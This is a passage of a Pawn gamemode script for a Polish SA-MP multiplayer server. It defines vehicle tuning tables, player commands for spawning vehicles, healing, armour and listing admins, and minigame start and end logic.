		case 505: addVehicleComponent(vehicleid, 1000, 1002, 1004, 1005, 1006, 1010, 1013, 1016, 1018, 1019, 1020, 1024, 1086, 1087);
		case 516: addVehicleComponent(vehicleid, 1000, 1002, 1004, 1007, 1010, 1015, 1016, 1017, 1018, 1019, 1020, 1021, 1086, 1087);
		case 517: addVehicleComponent(vehicleid, 1002, 1003, 1007, 1010, 1016, 1017, 1018, 1019, 1020, 1023, 1086, 1087, 1142, 1143, 1144, 1145);
		case 518: addVehicleComponent(vehicleid, 1001, 1003, 1005, 1006, 1007, 1010, 1013, 1017, 1018, 1020, 1023, 1086, 1087, 1142, 1143, 1144, 1145);
		case 527: addVehicleComponent(vehicleid, 1001, 1007, 1010, 1014, 1015, 1017, 1018, 1020, 1021, 1086, 1087);
		case 529: addVehicleComponent(vehicleid, 1001, 1003, 1006, 1007, 1010, 1011, 1012, 1017, 1018, 1019, 1020, 1023, 1086, 1087);
		case 534: addVehicleComponent(vehicleid, 1010, 1086, 1087, 1100, 1101, 1106, 1122, 1123, 1124, 1125, 1126, 1127, 1178, 1179, 1180, 1185);
		case 535: addVehicleComponent(vehicleid, 1010, 1086, 1087, 1109, 1110, 1111, 1112, 1113, 1114, 1115, 1116, 1117, 1118, 1119, 1120, 1121);
		case 536: addVehicleComponent(vehicleid, 1010, 1086, 1087, 1103, 1104, 1105, 1107, 1108, 1128, 1181, 1182, 1183, 1184);
		case 540: addVehicleComponent(vehicleid, 1001, 1004, 1006, 1007, 1010, 1017, 1018, 1019, 1020, 1023, 1024, 1086, 1087, 1142, 1143, 1144, 1145);
		case 542: addVehicleComponent(vehicleid, 1010, 1014, 1015, 1018, 1019, 1020, 1021, 1086, 1087, 1142, 1143, 1144, 1145);
		case 546: addVehicleComponent(vehicleid, 1001, 1002, 1004, 1006, 1007, 1010, 1017, 1018, 1019, 1023, 1024, 1086, 1087, 1142, 1143, 1144, 1145);
		case 547: addVehicleComponent(vehicleid, 1000, 1003, 1010, 1016, 1018, 1019, 1020, 1021, 1086, 1087);
		case 549: addVehicleComponent(vehicleid, 1001, 1003, 1007, 1010, 1011, 1012, 1017, 1018, 1019, 1020, 1023, 1086, 1087, 1142, 1143, 1144, 1145);
		case 550: addVehicleComponent(vehicleid, 1001, 1003, 1004, 1005, 1006, 1010, 1018, 1019, 1020, 1023, 1086, 1087, 1142, 1143, 1144, 1145);
		case 551: addVehicleComponent(vehicleid, 1002, 1003, 1005, 1006, 1010, 1016, 1018, 1019, 1020, 1021, 1023, 1086, 1087);
		case 558: addVehicleComponent(vehicleid, 1010, 1086, 1087, 1088, 1089, 1090, 1091, 1092, 1093, 1094, 1095, 1163, 1164, 1165, 1166, 1167, 1168);
		case 559: addVehicleComponent(vehicleid, 1010, 1065, 1066, 1067, 1068, 1069, 1070, 1071, 1072, 1086, 1087, 1158, 1159, 1160, 1161, 1162, 1173);
		case 560: addVehicleComponent(vehicleid, 1010, 1026, 1027, 1028, 1029, 1030, 1031, 1032, 1033, 1086, 1087, 1138, 1139, 1140, 1141, 1169, 1170);
		case 561: addVehicleComponent(vehicleid, 1010, 1055, 1056, 1057, 1058, 1059, 1060, 1061, 1062, 1063, 1064, 1086, 1087, 1154, 1155, 1156, 1157);
		case 562: addVehicleComponent(vehicleid, 1010, 1034, 1035, 1036, 1037, 1038, 1039, 1040, 1041, 1086, 1087, 1146, 1147, 1148, 1149, 1171, 1172);
		case 565: addVehicleComponent(vehicleid, 1010, 1045, 1046, 1047, 1048, 1049, 1050, 1051, 1052, 1053, 1054, 1086, 1087, 1150, 1151, 1152, 1153);
		case 567: addVehicleComponent(vehicleid, 1010, 1086, 1087, 1102, 1129, 1130, 1131, 1132, 1133, 1186, 1187, 1188, 1189);
		case 575: addVehicleComponent(vehicleid, 1010, 1042, 1043, 1044, 1086, 1087, 1099, 1174, 1175, 1176, 1177);
		case 576: addVehicleComponent(vehicleid, 1010, 1086, 1087, 1134, 1135, 1136, 1137, 1190, 1191, 1192, 1193);
		case 580: addVehicleComponent(vehicleid, 1001, 1006, 1007, 1010, 1017, 1018, 1020, 1023, 1086, 1087);
		case 585: addVehicleComponent(vehicleid, 1001, 1003, 1006, 1007, 1010, 1013, 1017, 1018, 1019, 1020, 1023, 1086, 1087, 1142, 1143, 1144, 1145);
		case 589: addVehicleComponent(vehicleid, 1000, 1004, 1005, 1006, 1007, 1010, 1013, 1016, 1017, 1018, 1020, 1024, 1086, 1087, 1142, 1143, 1144, 1145);
		case 600: addVehicleComponent(vehicleid, 1004, 1005, 1006, 1007, 1010, 1013, 1017, 1018, 1020, 1022, 1086, 1087);
		case 603: addVehicleComponent(vehicleid, 1001, 1006, 1007, 1010, 1017, 1018, 1019, 1020, 1023, 1024, 1086, 1087, 1142, 1143, 1144, 1145);
		case 402, 409, 411, 412, 419, 424, 438, 442, 445, 451, 458, 466, 467, 474, 475, 479, 480, 506, 507, 526, 533, 541, 545, 555, 566, 579, 587, 602: addVehicleComponent(vehicleid, 1010, 1086, 1087);
	}
	return 1;
}

CMD:flip(playerid, params[])
{
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return DialogError(playerid, "{FFFF00}Musisz byæ kierowc¹ pojazdu.");
    new currentveh;
    new Float:angle;
    currentveh = GetPlayerVehicleID(playerid);
    GetVehicleZAngle(currentveh, angle);
    SetVehicleZAngle(currentveh, angle);
    return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Pojazd obrócony.");
}

CMD:numberplate(playerid, params[]) return cmd_plate(playerid, params);
CMD:plate(playerid, params[]) {
	new strnp[256];
	if(sscanf(params, "s[16]", strnp)) return SyntaxError(playerid, "{01FCFF}/plate [text (max 16)]");
	new vid = GetPlayerVehicleID(playerid);
	SetVehicleNumberPlate(vid, strnp);
	SetVehicleToRespawn(vid);
	return SetTimerEx("DelayedPut", 1900, 0, "ii", playerid, vid); }

forward DelayedPut(playerid, vehicleid);
public DelayedPut(playerid, vehicleid) PutPlayerInVehicle(playerid, vehicleid, 0);

CMD:tune(playerid, params[])
{
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return DialogError(playerid, "{FFFF00}Musisz byæ kierowc¹ pojazdu.");
	tuneCar(GetPlayerVehicleID(playerid));
	return Sound(playerid,1133,0.0,0.0,0.0);
}

CMD:cvc(playerid, params[])
{
	new c1, c2;
	if(sscanf(params, "ii", c1, c2)) return SyntaxError(playerid, "{01FCFF}/cvc [kolor 1] [kolor 2]");
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return DialogError(playerid, "{FFFF00}Musisz byæ kierowc¹ pojazdu.");
	ChangeVehicleColor(GetPlayerVehicleID(playerid), c1, c2);
	return Sound(playerid,1133,0.0,0.0,0.0);
}

validModel(modelid) return (modelid < 400 || modelid > 609); 
Restricted(modelid) { switch(modelid) { case 425, 432, 435, 447, 450, 464, 501, 520, 537, 538, 569, 570, 584, 590, 591, 606, 607, 608: return 1; } return 0; }
CMD:nrg(playerid, params[]) return cmd_v(playerid, "nrg");
CMD:v(playerid, params[]) 
{
    if(GetPlayerState(playerid) == PLAYER_STATE_PASSENGER) return DialogError(playerid, "{FFFF00}Przed u¿yciem tej komendy opuœæ pojazd.");
	if(OnNonDM[playerid]) return DialogError(playerid, "{FFFF00}Spawn pojazdów w tym miejscu jest niemo¿liwy.");
    if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER) return DialogError(playerid, "{FFFF00}Aktualnie prowadzisz inny pojazd.");
	new Vehicle[32], VehicleID, ColorOne, ColorTwo, Float:x, Float:y, Float:z, Float:pAngle, anim[2][32];
	if(Player[playerid][Cash] < 50 && Player[playerid][Vip] < gettime()) return DialogError(playerid, "{FFFF00}Kupno pojazdu kosztuje "C_WHITE"$50{FFFF00} (VIP za darmo).");
 	if(sscanf(params, "s[32]D(1)D(1", Vehicle, ColorOne, ColorTwo)) return SyntaxError(playerid, "{01FCFF}/v [vehicle name/id] [color 1] [color 2]");
	GetAnimationName(GetPlayerAnimationIndex(playerid), anim[0], 32, anim[1], 32);
	if(!IsNumeric(Vehicle)) {
 		VehicleID = GetVehicleModelIDFromName(Vehicle);
		if(validModel(VehicleID) || Restricted(VehicleID)) return SendClientMessage(playerid, RED, "Nieprawid³owa nazwa pojazdu lub pojazd jest zabroniony."); }
	else {
	    VehicleID = strval(Vehicle);
		if(validModel(VehicleID) || Restricted(VehicleID)) return SendClientMessage(playerid, RED, "Nieprawid³owe ID pojazdu."); }
	if(!strcmp(anim[0], "PARACHUTE") && anim[0][1]) return DialogError(playerid, "{FFFF00}Nie mo¿esz teraz przywo³aæ pojazdu.");
	if(GetPlayerInterior(playerid)) return DialogError(playerid, "{FFFF00}Nie mo¿esz przywo³aæ pojazdu w tym miejscu.");
	if(Player[playerid][Vip] < gettime()) Player[playerid][Cash] -= 50;
	GetPlayerPos(playerid, x, y, z);
	GetPlayerFacingAngle(playerid, pAngle);
	if(vSpawned[playerid]) {
		DestroyVehicle(pVeh[playerid]);
		vSpawned[playerid] = false; }
	pVeh[playerid] = CreateVehicle(VehicleID, x, y, z+2.0, pAngle, ColorOne, ColorTwo, -1);
	SetVehicleHandling(pVeh[playerid]);
	vSpawned[playerid] = true;
	SetVehicleNumberPlate(VehicleID, "{6ba7d6}Impreza");
	SetVehicleNumberPlate(pVeh[playerid], "{6ba7d6}Impreza");
	SetVehicleToRespawn(pVeh[playerid]);
	LinkVehicleToInterior(pVeh[playerid], GetPlayerInterior(playerid));
	SetVehicleVirtualWorld(pVeh[playerid], GetPlayerVirtualWorld(playerid));
	PutPlayerInVehicle(playerid, pVeh[playerid], 0);
	return 1;
}

CMD:heal(playerid, params[]) return cmd_100hp(playerid, params);
CMD:uzdrow(playerid, params[]) return cmd_100hp(playerid, params);
CMD:zycie(playerid, params[]) return cmd_100hp(playerid, params);
CMD:100hp(playerid, params[]) 
{
	if(Player[playerid][Cash] < 500 && Player[playerid][Vip] < gettime()) return DialogError(playerid, "{FFFF00}Uleczenie siê kosztuje "C_WHITE"$500{FFFF00} (VIP za darmo).");
	if(HPTimering[playerid]) return 1;
	if(Player[playerid][Vip] > gettime())
	{
		HPTimer[playerid] = 5;
		SendClientMessage(playerid, GREEN, ""C_GREEN"Zostaniesz uleczony za "C_WHITE"5 "C_GREEN"sekund.");
	}
	else
	{
		HPTimer[playerid] = 10;
		SendClientMessage(playerid, GREEN, ""C_GREEN"Zostaniesz uleczony za "C_WHITE"10 "C_GREEN"sekund.");
	}
	HPTimering[playerid] = true;
	return 1;
}

CMD:armour(playerid, params[]) return cmd_kamizelka(playerid, params);
CMD:kami(playerid, params[]) return cmd_kamizelka(playerid, params);
CMD:kamizelka(playerid, params[]) 
{
	if(Player[playerid][Cash] < 1000 && Player[playerid][Vip] < gettime()) return DialogError(playerid, "{FFFF00}Kupno kamizelki kosztuje "C_WHITE"$1000{FFFF00} (VIP za darmo).");
	if(ArmorTimering[playerid]) return 1;
	if(Player[playerid][Vip] > gettime())
	{
		ArmorTimer[playerid] = 5;
	 	SendClientMessage(playerid, GREEN, ""C_GREEN"Kamizelkê otrzymasz za "C_WHITE"5 "C_GREEN"sekund.");
	}
	else
	{
		ArmorTimer[playerid] = 10;
 		SendClientMessage(playerid, GREEN, ""C_GREEN"Kamizelkê otrzymasz za "C_WHITE"10 "C_GREEN"sekund.");
	}
	ArmorTimering[playerid] = true;
	return 1;
}

CMD:admins(playerid, params[])
{
	if(ReflexType == 7) {
		AddExp(playerid, 40);
		Player[playerid][Cash] += 5000;
		Player[playerid][Czat]++;
  		new kodstr[256];
	  	format(kodstr, sizeof(kodstr), "{ff7768}[Reflex] "C_WHITE"%s(%d) {ff7768}wykonuje wyzwanie jako pierwszy!", Player[playerid][Name], playerid);
		SendClientMessageToAll(-1, kodstr);
		ReflexType = -1;
		ReflexActive = false;
		Loop(loopid, MAX_PLAYERS) {
		    if(IsPlayerConnected(loopid) && TDOn[loopid]) HideReflex(loopid); } }
    if(admins == 0) return SendClientMessage(playerid, RED, ""C_RED"Aktualnie nie ma nikogo z administracji na serwerze.");
	new s[2048];
 	format(s, sizeof(s), "{7FEF23}Administracja serwera:\n");
	Loop(adminid, MAX_PLAYERS) {
	    if(Player[adminid][Admin] == 4 && IsPlayerConnected(adminid)) {
			if(zw[adminid] == 1 || AFKPoints[adminid] < 1) format(s, sizeof(s), "%s{%06x}%s(%d) "HA" {E4FFCE}["C_RED"AFK{E4FFCE}]\n", s, GetPlayerColor(adminid) >>> 8, Player[adminid][Name], adminid);
	    	else format(s, sizeof(s), "%s{%06x}%s(%d) "HA" {E4FFCE}[{7FEF23}ONLINE{E4FFCE}]\n", s, GetPlayerColor(adminid) >>> 8, Player[adminid][Name], adminid); }
	    if(Player[adminid][Admin] == 3 && IsPlayerConnected(adminid)) {
			if(zw[adminid] == 1 || AFKPoints[adminid] < 1) format(s, sizeof(s), "%s{%06x}%s(%d) "VHA" {E4FFCE}["C_RED"AFK{E4FFCE}]\n", s, GetPlayerColor(adminid) >>> 8, Player[adminid][Name], adminid);
	    	else format(s, sizeof(s), "%s{%06x}%s(%d) "VHA" {E4FFCE}[{7FEF23}ONLINE{E4FFCE}]\n", s, GetPlayerColor(adminid) >>> 8, Player[adminid][Name], adminid); }
	    if(Player[adminid][Admin] == 2 && IsPlayerConnected(adminid)) {
			if(zw[adminid] == 1 || AFKPoints[adminid] < 1) format(s, sizeof(s), "%s{%06x}%s(%d) "ADMIN" {E4FFCE}["C_RED"AFK{E4FFCE}]\n", s, GetPlayerColor(adminid) >>> 8, Player[adminid][Name], adminid);
	    	else format(s, sizeof(s), "%s{%06x}%s(%d) "ADMIN" {E4FFCE}[{7FEF23}ONLINE{E4FFCE}]\n", s, GetPlayerColor(adminid) >>> 8, Player[adminid][Name], adminid); }
	    if(Player[adminid][Admin] == 1 && IsPlayerConnected(adminid)) {
			if(zw[adminid] == 1 || AFKPoints[adminid] < 1) format(s, sizeof(s), "%s{%06x}%s(%d) "JUNIOR" {E4FFCE}["C_RED"AFK{E4FFCE}]\n", s, GetPlayerColor(adminid) >>> 8, Player[adminid][Name], adminid);
	    	else format(s, sizeof(s), "%s{%06x}%s(%d) "JUNIOR" {E4FFCE}[{7FEF23}ONLINE{E4FFCE}]\n", s, GetPlayerColor(adminid) >>> 8, Player[adminid][Name], adminid); } }
	return ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""C_RED"Administracja {7FEF23}online", s, "Zamknij", "");
}

CMD:pl(playerid, params[]) return cmd_lag(playerid, params);
CMD:lag(playerid, params[])
{
	new s[2048], losted = 0;
	Loop(loopid, MAX_PLAYERS) {
		new Float:pl;
		GetPlayerPacketloss(loopid,pl);
	    if(pl > 0.99) losted++;
	    if(pl > 0.99 && pl < 3.99 && IsPlayerConnected(loopid)) format(s, sizeof(s), "%s{%06x}%s(%d) "C_ORANGE"- "C_LOLIVE"%.2f\n", s, GetPlayerColor(loopid) >>> 8, Player[loopid][Name], loopid, pl);
	    if(pl > 3.99 && pl < 9.99 && IsPlayerConnected(loopid)) format(s, sizeof(s), "%s{%06x}%s(%d) "C_ORANGE"- "C_ORANGE"%.2f\n", s, GetPlayerColor(loopid) >>> 8, Player[loopid][Name], loopid, pl);
  	    if(pl > 9.99 && IsPlayerConnected(loopid)) format(s, sizeof(s), "%s{%06x}%s(%d) "C_ORANGE"- {FF0000}%.2f\n", s, GetPlayerColor(loopid) >>> 8, Player[loopid][Name], loopid, pl); }
	if(losted == 0) format(s, sizeof(s), ""C_LOLIVE"Po³¹czenie wszystkich graczy wygl¹da na stabilne.");
	return ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""C_BLUE1"PacketLoss graczy", s, "Zamknij", "");
}

forward AutoStartZabawa();
public AutoStartZabawa()
{
	new gameid = random(MAX_GAMES);
//	new gameid = 8;
	if(Startuje[gameid] || Wystartowala[gameid]) return AutoStartZabawa();
  	Startuje[gameid] = true;
	new timerstr[256];
	format(timerstr, sizeof(timerstr), "%s_Start", GameName[gameid]);
	SetTimer(timerstr, 1000*19, 0);
	Loop(playerid, MAX_PLAYERS) Sound(playerid, 5021, 0.0, 0.0, 0.0);
	new zstr[256];
	format(zstr, sizeof(zstr), ""C_ZABAWA"Zabawa "C_WHITE"/%s "C_ZABAWA"wystartuje za "C_WHITE"20 "C_ZABAWA"sekund! "C_WHITE"({80d4ff}Automatyczny start"C_WHITE")", GameName[gameid]);
	SendClientMessageToAll(-1, zstr);
 	ZTimer[gameid] = 20;
 	RefreshZabawy();
 	TextDrawShowForAll(Textdraw[20]);
 	TextDrawShowForAll(Textdraw[21]);
 	TextDrawShowForAll(Textdraw[22]);
	return SetTimer("AutoStartZabawa", 1000*180, 0);
}

forward RefreshZabawy();
public RefreshZabawy()
{
	Loop(gameid, MAX_GAMES)
	{
	    Osoby[gameid] = 0;
	    Loop(playerid, MAX_PLAYERS) if(OnGame[playerid] == gameid && IsPlayerConnected(playerid)) { Osoby[gameid]++; }
		if(Wystartowala[gameid] && Osoby[gameid] < Min[gameid] && gameid != DB)
		{
  			Osoby[gameid] = 0;
		    new timerstr[256];
		    format(timerstr, sizeof(timerstr), "%s_End", GameName[gameid]);
		    return SetTimer(timerstr, 100, 0);
		}
		if(Startuje[gameid]) {
			new formats[256];
			format(formats, sizeof(formats), "/%s~w~~h~ - Zapisanych: ~b~~h~~h~%d~n~~w~~h~Pozostalo ~b~~h~~h~%d ~w~~h~sekund", GameName[gameid], Osoby[gameid], ZTimer[gameid]);
			TextDrawSetString(Textdraw[21], formats); }
	}
	return 1;
}

forward RefreshAreny();
public RefreshAreny() {
	new arenystr[256];
	new osoby = 0;
	Loop(arenaid, 8) osoby += OsobyA[arenaid];
	format(arenystr, sizeof(arenystr), "/areny ~w~~h~(%d)", osoby);
	TextDrawSetString(Textdraw[9], arenystr);
	return 1; }

forward WypiszZabawa(playerid);
public WypiszZabawa(playerid)
{
	if(EVUczestnik[playerid]) {
	    EVPlayers--;
	    EVUczestnik[playerid] = false;
		SetPlayerVirtualWorld(playerid, 0);
		SpawnFunction(playerid); }
	new cgameid = OnGame[playerid];
	if(Wystartowala[cgameid])
	{
	    if(cgameid == RK) {
			GangZoneHideForPlayer(playerid, RKZone);
			RKOK[playerid] = false;
			RKPlayers--; }
		if(cgameid == GG) GangZoneHideForPlayer(playerid, GGZone);
	    if(cgameid == CH) { CHPlayers--; }
 	    if(cgameid == RC)
	    {
	    	RCPlayers--;
	    	DestroyVehicle(RCVehicle[playerid]);
			DisablePlayerCheckpoint(playerid);
			DisablePlayerRaceCheckpoint(playerid);
			DisableRemoteVehicleCollisions(playerid, 0);
		}
	    Osoby[cgameid]--;
   	    if(cgameid == DB) {
		   DBPlayers--;
		   DestroyVehicle(pVeh[playerid]);
		   vSpawned[playerid] = false; }
		if(cgameid == SP) {
		    SpecToggle(playerid, false);
			SPTeam[playerid] = 0;
			TextDrawHideForPlayer(playerid, SPTD); }
		if(cgameid == BA) {
			BAPlayers--;
			BATeam[playerid] = -1;
			SetTimer("BA_Check", 1000*2, 0); }
	    ResetPlayerWeapons(playerid);
	    SetPlayerHealth(playerid, 100.0);
	    SetPlayerArmour(playerid, 100.0);
	    SetPlayerVirtualWorld(playerid, 0);
 	    OnGame[playerid] = -1;
		SpawnPlayer(playerid);
		SpawnFunction(playerid);
		if(OnGame[playerid] != DB) RefreshZabawy();
	}
	else
	{
	    OnGame[playerid] = -1;
	    RefreshZabawy();
	}
	return 1;
}

forward DestroyBox(boxid, playerid);
public DestroyBox(boxid, playerid)
{
	new graczeba = 0;
	Loop(loopid, MAX_PLAYERS) { if(IsPlayerConnected(loopid) && BATeam[loopid] == BoxType[boxid]) graczeba++; }
	if(graczeba < 1) return 1;
	DestroyDynamicObject(Box[boxid]);
	BoxOnMap[boxid] = false;
	new team = BoxType[boxid];
	PunktyBA[team]--;
	if(PunktyBA[team] < 1) {
		switch(BoxType[boxid]) {
			 case 0: SendClientMessageToAll(-1, ""C_WHITE"["C_ZABAWA"BaseAttack"C_WHITE"] {FFFF00}Dru¿yna czerwona straci³a wszystkie punkty!");
			 case 1: SendClientMessageToAll(-1, ""C_WHITE"["C_ZABAWA"BaseAttack"C_WHITE"] {10FF00}Dru¿yna zielona straci³a wszystkie punkty!");
			 case 2: SendClientMessageToAll(-1, ""C_WHITE"["C_ZABAWA"BaseAttack"C_WHITE"] {4982F4}Dru¿yna niebieska straci³a wszystkie punkty!");
			 case 3: SendClientMessageToAll(-1, ""C_WHITE"["C_ZABAWA"BaseAttack"C_WHITE"] {FFF000}Dru¿yna ¿ó³ta straci³a wszystkie punkty!"); } }
	return 1;
}

forward CheckIsBABox(objectid, playerid);
public CheckIsBABox(objectid, playerid)
{
  for (new boxy = 0; boxy < MAX_BABOXES; boxy++) {
  	if(objectid == Box[boxy] && BoxOnMap[boxy]) {
	    if(BoxType[boxy] != BATeam[playerid]) return DestroyBox(boxy, playerid); } }
	return 1;
}

public OnPlayerShootDynamicObject(playerid, weaponid, objectid, Float:x, Float:y, Float:z)
{
	if(OnGame[playerid] == BA && Wystartowala[BA]) return CheckIsBABox(objectid, playerid);
	if(objectid == BDbudynek)
	{
	    if(BDCC) return 1;
	   	new newhp = random(20) + 1;
     	BDHP -= newhp;
      	if(BDHP <= 0) {
       		BDCC = true;
			AddExp(playerid, 200);
			Player[playerid][Cash] += 20000;
			new msgstr[256];
    		format(msgstr, sizeof(msgstr), ""PYTAJNIK""C_NICK"%s(%d) "C_ZABAWA"wygrywa zabawê "C_WHITE"/BD"C_ZABAWA".", Player[playerid][Name], playerid);
    		SendClientMessageToAll(-1, msgstr);
    		Player[playerid][Zabawyp]++;
     		if(pAch[playerid][18] < 1) {
    		    if(Player[playerid][Zabawyp] >= 100 && pAch[playerid][18] < 1) {
					pAch[playerid][18] = 1;
					AddExp(playerid, 200);
					Sound(playerid,1137,0.0,0.0,0.0);
					SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Imprezowicz (1)", "New achievement: "C_NICK"Imprezowicz (1)"); }
    		    if(Player[playerid][Zabawyp] >= 250 && pAch[playerid][18] < 2) {
					pAch[playerid][18] = 2;
					AddExp(playerid, 400);
					Sound(playerid,1137,0.0,0.0,0.0);
					SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Imprezowicz (2)", "New achievement: "C_NICK"Imprezowicz (2)"); }
    		    if(Player[playerid][Zabawyp] >= 500 && pAch[playerid][18] < 3) {
					pAch[playerid][18] = 3;
					AddExp(playerid, 600);
					Sound(playerid,1137,0.0,0.0,0.0);
					SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Imprezowicz (3)", "New achievement: "C_NICK"Imprezowicz (3)"); } }
			BD_End();
			return 1; }
		if(BDHP < 3500 && BDHP > 3000) Update3DTextLabelText(BDText, 0xFFFFFFFF, ""C_ORANGE"Budynek\n"C_WHITE"["C_LOLIVE"#######_"C_WHITE"]");
		if(BDHP < 3000 && BDHP > 2500) Update3DTextLabelText(BDText, 0xFFFFFFFF, ""C_ORANGE"Budynek\n"C_WHITE"["C_GREEN"######__"C_WHITE"]");
		if(BDHP < 2500 && BDHP > 2000) Update3DTextLabelText(BDText, 0xFFFFFFFF, ""C_ORANGE"Budynek\n"C_WHITE"["C_GREEN"#####___"C_WHITE"]");
		if(BDHP < 2000 && BDHP > 1500) Update3DTextLabelText(BDText, 0xFFFFFFFF, ""C_ORANGE"Budynek\n"C_WHITE"["C_ORANGE"####____"C_WHITE"]");
		if(BDHP < 1500 && BDHP > 1000) Update3DTextLabelText(BDText, 0xFFFFFFFF, ""C_ORANGE"Budynek\n"C_WHITE"["C_ORANGE"###_____"C_WHITE"]");
		if(BDHP < 1000 && BDHP > 500) Update3DTextLabelText(BDText, 0xFFFFFFFF, ""C_ORANGE"Budynek\n"C_WHITE"["C_ORANGE"##______"C_WHITE"]");
		if(BDHP < 500 && BDHP > 0) Update3DTextLabelText(BDText, 0xFFFFFFFF, ""C_ORANGE"Budynek\n"C_WHITE"[{FF0000}#_______"C_WHITE"]");
	}
	Loop(hayid, MAX_HAYS) {
	    if(objectid == HayObj[hayid] && IsHayCreated[hayid]) {
	        IsHayCreated[hayid] = false;
	        HayType[hayid] = 0;
	        DestroyDynamicObject(HayObj[hayid]); } }
	Loop(platforma, MAX_PLATFORMY)
	{
	    if(objectid == SPo[platforma])
	    {
	    	if(SPoOnMap[platforma])
	    	{
	        	if(SPoTType[platforma] == 0) {
	            	if(SPTeam[playerid] == 1) {
						SPoTType[platforma] = 1;
	                	PunktyRedzi++;
      					SetDynamicObjectMaterial(SPo[platforma], 0, 18646, "matcolours", "grey-40-percent", 0xFF990000);
						SP_Stats(); }
	            	if(SPTeam[playerid] == 2) {
						SPoTType[platforma] = 2;
	                	PunktyBlue++;
						SetDynamicObjectMaterial(SPo[platforma], 0, 18646, "matcolours", "grey-40-percent", 0xFF0099FF);
						SP_Stats(); } }
	        	if(SPoTType[platforma] == 1) {
	            	if(SPTeam[playerid] == 2) {
						SPoTType[platforma] = 2;
						PunktyRedzi--;
	                	PunktyBlue++;
						SetDynamicObjectMaterial(SPo[platforma], 0, 18646, "matcolours", "grey-40-percent", 0xFF0099FF);
						SP_Stats();
						Loop(lid, MAX_PLAYERS) { if(SPTeam[lid] == 1) Sound(lid, 1055, 0.0, 0.0, 0.0); } } }
	        	if(SPoTType[platforma] == 2) {
	            	if(SPTeam[playerid] == 1) {
						SPoTType[platforma] = 1;
						PunktyBlue--;
	                	PunktyRedzi++;
						SetDynamicObjectMaterial(SPo[platforma], 0, 18646, "matcolours", "grey-40-percent", 0xFF990000);
						SP_Stats();
						Loop(lid, MAX_PLAYERS) { if(SPTeam[lid] == 2) Sound(lid, 1055, 0.0, 0.0, 0.0); }  } }
			}
	    }
	}
  if(objectid == SarnaObj) {
    Delete3DTextLabel(Sarna3D);
    DestroyDynamicObject(SarnaObj);
    Sarnanamapie = false;
    AddExp(playerid, 500);
    return SendClientMessage(playerid, -1, ""C_ORANGE"Sarna zabita! Otrzymujesz {FF0000}500 "C_ORANGE"EXP.");
  }
	return 1;
}

forward BD_Start();
public BD_Start()
{
	if(Osoby[BD] < Min[BD])
	{
		Loop(playerid, MAX_PLAYERS) { if(OnGame[playerid] == BD) OnGame[playerid] = -1; }
	    Startuje[BD] = false;
 	    return RefreshZabawy();
	}
	Update3DTextLabelText(BDText, 0xFFFFFFFF, ""C_ORANGE"Budynek\n"C_WHITE"["C_LOLIVE"########"C_WHITE"]");
	BDHP = 4000;
	BDCC = false;
	Wystartowala[BD] = true;
	Startuje[BD] = false;
	Loop(playerid, MAX_PLAYERS)
	{
	    if(OnGame[playerid] == BD) {
	        ForceObj(playerid);
	        new infostr[256];
	        format(infostr, sizeof(infostr), ""PYTAJNIK""C_ORANGE"Zbij {FF0000}HP budynku "C_ORANGE"do zera jako pierwszy przeszkadzaj¹c innym granatami.");
			SendClientMessage(playerid, -1, infostr);
	        TogglePlayerControllable(playerid, 0);
	        SetPlayerVirtualWorld(playerid, 89);
	       	switch(random(6)) {
	    		case 0: SetPlayerPos(playerid, 2343.6631,749.5077,816.1562);
	    		case 1: SetPlayerPos(playerid, 2401.7966,759.4584,816.1562);
	    		case 2: SetPlayerPos(playerid, 2452.9175,758.5491,816.1562);
	    		case 3: SetPlayerPos(playerid, 2457.1807,863.0143,816.1562);
	    		case 4: SetPlayerPos(playerid, 2401.6150,856.5059,816.1562);
  		 		case 5: SetPlayerPos(playerid, 2351.3130,859.1952,816.1562); }
	        SetPlayerArmour(playerid, 100.0);
	        SetPlayerHealth(playerid, 100.0);
			ResetPlayerWeapons(playerid);
			GivePlayerWeapon(playerid, 29, 9989);
			GivePlayerWeapon(playerid, 16, 9999);
			SetTimerEx("unfreezePlayer", 1500, 0, "i", playerid);
		}
	}
	RefreshZabawy();
	return 1;
}

forward BD_End();
public BD_End()
{
	BDHP = 4000;
	Startuje[BD] = false;
	Osoby[BD] = 0;
	Wystartowala[BD] = false;
	Loop(playerid, MAX_PLAYERS)
	{
	    if(OnGame[playerid] == BD) {
	    	WypiszZabawa(playerid);
 	    	OnGame[playerid] = -1;
	    	ResetPlayerWeapons(playerid);
	    	SetPlayerHealth(playerid, 100.0);
	    	SetPlayerArmour(playerid, 100.0);
	    	SetPlayerVirtualWorld(playerid, 0);
			SpawnPlayer(playerid);
			SpawnFunction(playerid); }
	}
	RefreshZabawy();
}

forward TR_Start();
public TR_Start()
{
	if(Osoby[TR] < Min[TR])
	{
		Loop(playerid, MAX_PLAYERS) { if(OnGame[playerid] == TR) OnGame[playerid] = -1; }
	    Startuje[TR] = false;
		return RefreshZabawy();
	}
	TRPlayers = 0;
	TRRundaTrwa = false;
	TRRound = 0;
	Wystartowala[TR] = true;
	Startuje[TR] = false;
	Loop(playerid, MAX_PLAYERS)
	{
	    if(OnGame[playerid] == TR && IsPlayerConnected(playerid)) {
	        TRPlayers++;
	        ForceObj(playerid);
	        SetPlayerVirtualWorld(playerid, 112);
	        TogglePlayerControllable(playerid, 0);
	       	switch(random(9)) {
	    		case 0: SetPlayerPos(playerid, 3146.1948,1876.0012,19.7842);
	    		case 1: SetPlayerPos(playerid, 3239.7458,1867.4421,19.7842);
	    		case 2: SetPlayerPos(playerid, 3247.3184,1983.5540,19.7842);
	    		case 3: SetPlayerPos(playerid, 3146.0886,1982.9078,19.7842);
	    		case 4: SetPlayerPos(playerid, 3185.0862,1949.1427,19.7842);
  		 		case 5: SetPlayerPos(playerid, 3200.1208,1921.9686,19.7842);
  		 		case 6: SetPlayerPos(playerid, 3180.1052,1956.6196,19.7842);
  		 		case 7: SetPlayerPos(playerid, 3221.9724,1965.6299,19.7842);
